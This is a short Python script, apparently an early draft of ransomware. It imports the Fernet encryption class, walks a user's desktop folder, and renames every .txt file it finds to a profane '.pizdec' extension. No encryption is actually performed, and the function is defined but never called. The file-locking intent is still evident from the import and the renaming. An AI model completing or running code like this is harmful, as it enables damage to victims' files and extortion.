import os
from cryptography.fernet import Fernet

path = r'C:\Users\Pavel\Desktop\Dmg'

def seerch_file(path):
    for root, dirs, files in os.walk(path):
        for name in files:
            f = os.path.join(root, name)
            if '.txt' in f:
                _name = f
                base = os.path.splitext(_name)[0]
                os.rename(_name, base + '.pizdec')
